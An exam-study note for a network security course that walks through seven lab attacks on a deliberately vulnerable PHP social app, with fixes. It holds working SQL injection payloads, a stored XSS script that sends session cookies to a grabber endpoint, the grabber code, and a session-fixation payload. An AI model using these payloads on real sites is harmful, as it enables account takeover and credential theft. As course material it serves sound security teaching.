# Exam Study — SocialNet Security Lab (ATT-1 to ATT-7)

**Source:** SocialNet Web Application Security Analysis Reports (your Lab deliverable)
**Stack:** PHP 8.3, MySQL 8.0, nginx 1.24, Ubuntu 24.04 — deployed at `http://192.168.122.32/`
**Repo:** https://github.com/mainamkhanh23102005/Social-Net
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]
**Tags:** #CS451 #exam #lab #web-security #sqli #xss #csrf #session-hijacking #socialnet

> This is the **hands-on report version** of the attacks (using **mysqli** `$conn->query()` / `bind_param()`, the exact payloads, dumped hashes, and grabber code you used). Complements [[Exam Study - Web Application Security]] (the lecture/PDO version).

---

## Quick Lookup Index

**Sections:**
1. The Application (pages = attack surface)
2. Branch Map (which branch reintroduces which bug)
3. Attack Catalog ATT-1 → ATT-7 (one block each)
4. Master Payload Table
5. Defense Master Table
6. Deep Dive: Why Each Attack Works
7. Vulnerable vs Fixed Code (mysqli)

**Key Terms:** ATT-1 broken access control, ATT-2 missing authentication, ATT-3 SQLi UPDATE, ATT-4 UNION SELECT dump, ATT-5 auth-bypass UNION, ATT-6 stored XSS session hijacking, ATT-7 session fixation, `$_GET['owner']`, `profile.php`, `signin.php`, `setting.php`, `admin/newuser.php`, `$conn->query()`, `bind_param()`, `password_verify()`, `password_hash()`, `session_regenerate_id()`, `htmlspecialchars()`, `nl2br()`, HttpOnly, `session.use_strict_mode`, PHPSESSID, grabber `sink.php`, htpasswd, CSRF token

---

## 1. The Application (Attack Surface)

| Page | URL | Function |
|---|---|---|
| Sign In | `/signin.php` | Authenticate; set PHPSESSID; redirect home |
| Home | `/index.php` | Friend requests, friends list, user directory (CSRF-token friend forms) |
| Profile | `/profile.php?owner=<username>` | Show fullname + description of `owner` (defaults to session user) |
| Settings | `/setting.php` | Update own description (POST) |
| About | `/about.php` | Static page |
| Sign Out | `/signout.php` | Destroy session |
| Friend endpoints | `/accept_friend.php`, `/reject_friend.php` | Mutate friend tables (CSRF-protected) |
| **Admin** | `/admin/newuser.php` | Create users (outside `socialnet/` dir) |

Tables: `account` (username, fullname, password, description), `friends`, `friend_requests`.

---

## 2. Branch Map

| Branch | Reintroduced bug |
|---|---|
| `main` | ATT-1 & ATT-2 exploitable as committed |
| `att-3` | Raw SQL concat in `setting.php` → SQLi UPDATE |
| `att-4` | Raw SQL concat in `profile.php` → UNION SELECT dump |
| `att-5` | Raw SQL concat in `signin.php` → auth bypass |
| `att-6` | Unescaped output in `profile.php` → stored XSS + session hijack |
| `att-7` | att-6 code **plus** missing `session_regenerate_id()` → session fixation |

---

## 3. Attack Catalog

### ATT-1 — Broken Access Control (view any profile) · *High*
**What:** No authorization check on `profile.php`; any logged-in user views anyone's profile by URL.
**Steps:**
1. Sign in as own account (e.g. `hahi`) → get PHPSESSID.
2. Identify a target username (e.g. `huhu`).
3. Visit `http://192.168.122.32/profile.php?owner=huhu` → full profile returned, no check.
**Root cause:** `$owner = $_GET['owner']` used directly; only `if (!isset($_SESSION['username']))` (authentication) is checked, never **authorization**. `validate_url_token()` exists but is never called — and is itself broken (`return !empty($token);` accepts any non-empty value).
**Fix:** check confirmed friendship (session_user → owner) in `friends` table; else `http_response_code(403)`. Repair token with `hash_hmac()` + `hash_equals()`.

### ATT-2 — Missing Authentication (admin user creation) · *Critical*
**What:** `/admin/newuser.php` is reachable by **anyone, unauthenticated** — creates accounts. This is the precondition for all other attacks (provision accounts at will). OWASP A01:2021.
**Steps:**
1. Open incognito (no cookies).
2. Go to `http://192.168.122.32/admin/newuser.php` → form loads, no login.
3. Submit `username=attacker1, password=hacked123, ...` → "User created successfully!".
   Verify: `SELECT * FROM socialnet.account WHERE username='attacker1';`
**Root cause:** file starts `require_once '../db.php';` with **no `session_start()` and no auth check** (other pages have the guard clause). No `role` column in schema; no nginx-level `/admin/` protection.
**Fix (defense in depth):** Layer 1 = nginx Basic Auth on `/admin/`; Layer 2 = PHP role check.

### ATT-3 — SQL Injection in UPDATE (modify any user) · *High*
**What:** `setting.php` interpolates the description into a raw `UPDATE`; attacker breaks out and re-targets the `WHERE`.
**Steps:**
1. Sign in (e.g. `hahi`).
2. In the **description** textarea enter (note **trailing space** after `--`):
   `PWNED' WHERE username='huhu' -- `
3. Submit. Effective SQL:
   `UPDATE account SET description = 'PWNED' WHERE username='huhu' -- ' WHERE username = 'hahi'`
   → `--` comments out the original WHERE; `huhu`'s description becomes `PWNED`.
**Root cause:** `$sql = "UPDATE account SET description = '$new_description' WHERE username = '$current_user'"; $conn->query($sql);`
**Fix:** `bind_param("ss", $new_description, $current_user)`.

### ATT-4 — UNION SELECT (dump all credentials) · *Critical*
**What:** `profile.php` concatenates `$_GET['owner']`; UNION reads any table → dump `username,password`.
**Steps:**
1. Confirm 2 columns reflected (`fullname, description`).
2. URL (single-quote `%27`, space `%20`, comma `%2C`):
   `http://192.168.122.32/profile.php?owner=x%27%20UNION%20SELECT%20username%2C%20password%20FROM%20account%20--%20`
3. Effective SQL: `SELECT fullname, description FROM account WHERE username = 'x' UNION SELECT username, password FROM account -- '`
   → dumps all bcrypt hashes, e.g.
   `hahi: $2y$10$yzlhLJxlxzMXK9u0UjFJOO...`
   `huhu: $2y$10$NwOxlqsnvQobKSwxkNxkT...`
**Root cause:** `$sql = "SELECT fullname, description FROM account WHERE username = '$owner'"; $conn->query($sql);`
**Fix:** `bind_param("s", $owner)`; least-privilege DB user; input validation `^[A-Za-z0-9_]+$`; WAF (ModSecurity/OWASP CRS).

### ATT-5 — UNION Auth Bypass (login as anyone) · *Critical*
**What:** `signin.php` concatenates username; UNION injects a **synthetic auth row** with a bcrypt hash the attacker knows. `password_verify()` then *correctly* returns true.
**Steps:**
1. Generate a hash you control: `php -r "echo password_hash('hacked123', PASSWORD_DEFAULT);"` → `$2y$10$16PuFemba7ceVtLUwXcWV.Gbn9cXhunzqsi.ePor5ZbIDqiag17B2`
2. **Username field:** `' AND 1=0 UNION SELECT 'huhu', 'Huhu User', '$2y$10$16PuFemba7ceVtLUwXcWV.Gbn9cXhunzqsi.ePor5ZbIDqiag17B2' -- `
   **Password field:** `hacked123`
3. Effective SQL: `SELECT username, fullname, password FROM account WHERE username = '' AND 1=0 UNION SELECT 'huhu','Huhu User','$2y$10$...' -- '`
   → `AND 1=0` voids real rows; UNION supplies `huhu` + attacker's hash; `password_verify('hacked123', hash)` = TRUE → `$_SESSION['username']='huhu'`.
**Key insight:** `password_verify()` is *not* bypassed — it's fed inputs the attacker controls on both sides.
**Fix:** `bind_param("s", $username)`; add `session_regenerate_id(true)`; rate-limit; generic error message; MFA.

### ATT-6 — Stored XSS → Session Hijacking · *Critical*
**What:** Description stored unsanitized + output unescaped → attacker stores `<script>`; any viewer runs it; cookie (no HttpOnly) exfiltrated.
**Steps:**
1. Set up grabber `/var/www/html/socialnet/grabber/sink.php`:
   ```php
   <?php $data = $_GET['data'] ?? 'no data';
   file_put_contents('/tmp/stolen_cookies.log', date('Y-m-d H:i:s').' | Cookie: '.$data.PHP_EOL, FILE_APPEND);
   echo "OK"; ?>
   ```
2. As `hahi`, in **description** store:
   `<script>fetch('http://192.168.122.32/grabber/sink.php?data=' + document.cookie);</script>`
3. Victim `huhu` views `profile.php?owner=hahi` → browser runs script → `PHPSESSID=...` sent to grabber. Read `cat /tmp/stolen_cookies.log`, set stolen PHPSESSID in DevTools → logged in as `huhu`.
**Root cause:** `echo "<p>".nl2br($description)."</p>";` (no `htmlspecialchars`) + missing **HttpOnly** flag.
**Fix:** `htmlspecialchars($description, ENT_QUOTES, 'UTF-8')`; set cookie flags HttpOnly/Secure/SameSite; CSP header.

### ATT-7 — Session Fixation (via stored XSS) · *High*
**What:** Inverse of ATT-6 — attacker **forces** victim to use an attacker-known PHPSESSID; after victim logs in, that ID is authenticated.
**Steps:**
1. As `hahi`, record own PHPSESSID (`document.cookie`) e.g. `feefnd8du64g0fgm2aog527cbq`. Store payload:
   `<script>document.cookie='PHPSESSID=feefnd8du64g0fgm2aog527cbq; path=/';</script>` then log out.
2. Victim `huhu` views `profile.php?owner=hahi` → cookie overwritten → victim logs in. PHP **reuses** the same ID (no `session_regenerate_id()`), binding `huhu` to the attacker-known ID.
3. Attacker sets `document.cookie='PHPSESSID=feefnd8du64g0fgm2aog527cbq'` → `/index.php` → logged in as `huhu`. **No grabber needed → stealthier.**
**Root cause:** stored XSS (as ATT-6) + **missing `session_regenerate_id()`** on login + `session.use_strict_mode = 0`.
**Fix:** fix XSS; `session_regenerate_id(true)` on every login; `session.use_strict_mode = 1`.

---

## 4. Master Payload Table

| ATT | Where | Exact payload |
|---|---|---|
| 1 | Address bar | `http://192.168.122.32/profile.php?owner=huhu` |
| 2 | Browser | `http://192.168.122.32/admin/newuser.php` (just submit form) |
| 3 | description field | `PWNED' WHERE username='huhu' -- ` *(trailing space!)* |
| 4 | `owner` URL param | `x%27%20UNION%20SELECT%20username%2C%20password%20FROM%20account%20--%20` |
| 5 | username field | `' AND 1=0 UNION SELECT 'huhu', 'Huhu User', '<bcrypt-hash>' -- ` + password `hacked123` |
| 6 | description field | `<script>fetch('http://192.168.122.32/grabber/sink.php?data='+document.cookie);</script>` |
| 7 | description field | `<script>document.cookie='PHPSESSID=<attacker-id>; path=/';</script>` |

---

## 5. Defense Master Table

| Attack | Primary Fix | Defense in Depth |
|---|---|---|
| ATT-1 | Authorization check (friends/owner) + 403 | Repair token with `hash_hmac`+`hash_equals` |
| ATT-2 | PHP auth/role check | nginx Basic Auth on `/admin/`; add `role` column |
| ATT-3 | `bind_param()` prepared statement | Least-privilege DB user |
| ATT-4 | `bind_param()` prepared statement | Input validation regex; WAF; least privilege |
| ATT-5 | `bind_param()` + `session_regenerate_id(true)` | Rate limit; generic errors; MFA |
| ATT-6 | `htmlspecialchars(ENT_QUOTES)` output encoding | HttpOnly/Secure/SameSite cookies; CSP |
| ATT-7 | `session_regenerate_id(true)` on login | `session.use_strict_mode=1`; fix XSS |

---

## 6. Deep Dive: Why Each Attack Works

**SQLi family (ATT-3/4/5)** share one root defect: **string concatenation** of user input into SQL via `$conn->query()`. The fix is structurally identical everywhere — `$conn->prepare()` + `bind_param()`. With a prepared statement the **SQL template** (with `?` placeholders) is sent during `prepare()`, and the **values** are sent separately during `execute()`. The values are never lexically substituted into the SQL text, so the database treats them as **opaque data** — a quote in the input can never "break out" into code. The *exploitation* differs only because the SQL operation differs: append a `WHERE` to an UPDATE (ATT-3), `UNION SELECT` onto a read (ATT-4), or synthesize an auth row (ATT-5).

**ATT-5 is the subtle one:** it does **not** defeat `password_verify()`. That function is correctly implemented. SQLi simply *supplies it* with a username/hash pair the attacker controls, so it returns true per its contract. Lesson: secure crypto primitives are necessary but **not sufficient** — security is a *system* property; one weak component (SQLi) collapses an otherwise-correct one (bcrypt).

**XSS pair (ATT-6/7)** both need stored script execution in a victim's authenticated context. ATT-6 **steals** the session ID (requires exfiltration endpoint, leaves a log trail). ATT-7 **plants** a known session ID (no exfiltration, stealthier) — it exploits PHP's default of *reusing* the client-supplied PHPSESSID across the unauthenticated→authenticated transition. `session_regenerate_id(true)` breaks ATT-7 by issuing a fresh ID at login; `session.use_strict_mode=1` breaks it harder by refusing client-chosen IDs entirely. **HttpOnly** specifically blocks ATT-6's `document.cookie` read.

**ATT-1/2 (access control)** are not injection at all — they're *missing checks*. ATT-1 conflates **authentication** ("are you logged in?") with **authorization** ("are you allowed to see *this*?"). ATT-2 omits authentication entirely on a privileged endpoint. These map directly to the AAA model (Module 1): authentication present but authorization absent (ATT-1), or both absent (ATT-2).

---

## 7. Vulnerable vs Fixed Code (mysqli)

```php
// ATT-4 VULNERABLE — profile.php
$owner = isset($_GET['owner']) ? $_GET['owner'] : $_SESSION['username'];
$sql = "SELECT fullname, description FROM account WHERE username = '$owner'";
$result = $conn->query($sql);

// FIXED
$stmt = $conn->prepare("SELECT fullname, description FROM account WHERE username = ?");
$stmt->bind_param("s", $owner);
$stmt->execute();
$result = $stmt->get_result();
```
```php
// ATT-5 FIXED — signin.php
$stmt = $conn->prepare("SELECT username, fullname, password FROM account WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
if ($row = $result->fetch_assoc()) {
    if (password_verify($password, $row['password'])) {
        session_regenerate_id(true);              // also defeats ATT-7
        $_SESSION['username'] = $row['username'];
    }
}
```
```php
// ATT-6 FIXED — output encoding + cookie flags
echo "<p>" . nl2br(htmlspecialchars($description, ENT_QUOTES, 'UTF-8')) . "</p>";
session_set_cookie_params(['httponly'=>true, 'samesite'=>'Strict', 'secure'=>true]);
session_start();
```
```nginx
# ATT-2 FIXED — nginx Basic Auth on /admin/
location ^~ /admin/ {
    auth_basic "Admin Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.3-fpm.sock;
    }
}
# create creds: sudo htpasswd -c /etc/nginx/.htpasswd adminuser
```
```ini
; ATT-6/7 FIXED — php.ini hardening
session.use_strict_mode = 1
session.cookie_httponly = 1
session.cookie_samesite = Strict
```

---

## Lab Playbook (Copy-Paste)

```bash
# Generate a bcrypt hash for ATT-5 (pick your own password)
php -r "echo password_hash('hacked123', PASSWORD_DEFAULT);"
```
```
# ATT-1  view any profile
http://192.168.122.32/profile.php?owner=huhu

# ATT-2  unauth admin user creation
http://192.168.122.32/admin/newuser.php        (submit the form)

# ATT-3  SQLi UPDATE (description field) — keep trailing space
PWNED' WHERE username='huhu' -- 

# ATT-4  UNION dump (owner URL param)
http://192.168.122.32/profile.php?owner=x%27%20UNION%20SELECT%20username%2C%20password%20FROM%20account%20--%20

# ATT-5  auth bypass (username field) + password: hacked123
' AND 1=0 UNION SELECT 'huhu', 'Huhu User', '<your-bcrypt-hash>' -- 

# ATT-6  stored XSS cookie theft (description field)
<script>fetch('http://192.168.122.32/grabber/sink.php?data=' + document.cookie);</script>

# ATT-7  session fixation (description field)
<script>document.cookie='PHPSESSID=<attacker-known-id>; path=/';</script>
```
```php
// grabber sink.php (ATT-6 infra)
<?php $data = $_GET['data'] ?? 'no data';
file_put_contents('/tmp/stolen_cookies.log', date('Y-m-d H:i:s').' | Cookie: '.$data.PHP_EOL, FILE_APPEND);
echo "OK"; ?>
```

---

## Knowledge Check Q&A

**Q1:** Why does the trailing space matter in `PWNED' WHERE username='huhu' -- ` (ATT-3)?
**A:** MySQL's `--` comment syntax requires a space (or control char) after the two hyphens to be recognized.

**Q2:** ATT-5 doesn't break `password_verify()`. So how does login succeed?
**A:** UNION injects a row with the target username and a bcrypt hash the attacker generated; `password_verify(attacker_plaintext, attacker_hash)` is genuinely true.

**Q3:** What single code change fixes ATT-3, ATT-4, and ATT-5?
**A:** Replace `$conn->query()` string concatenation with `$conn->prepare()` + `bind_param()` (parameterized queries).

**Q4:** What flag would have blocked ATT-6's cookie theft even with the XSS present?
**A:** The **HttpOnly** flag on the session cookie (blocks `document.cookie` from JavaScript).

**Q5:** Difference between ATT-6 and ATT-7?
**A:** ATT-6 **steals** the victim's session ID (needs exfil endpoint, leaves logs). ATT-7 **forces** a known ID (session fixation, no exfil, stealthier) — fixed by `session_regenerate_id(true)`.

**Q6:** ATT-1 vs ATT-2 in AAA terms?
**A:** ATT-1 has authentication but **no authorization**; ATT-2 has **no authentication** at all on a privileged endpoint.

---

## Graph View Links

**Previous**: [[Exam Study - Lab 4.1 (Web Application Environment Setup)]]
**Next**: [[Exam Study - PortSwigger Labs (SQLi XSS CSRF Cheat Sheet)]]
**Hub**: [[CS451 - Hub]]
**Related**: [[Exam Study - Web Application Security]], [[Exam Study - Web Application Development]]
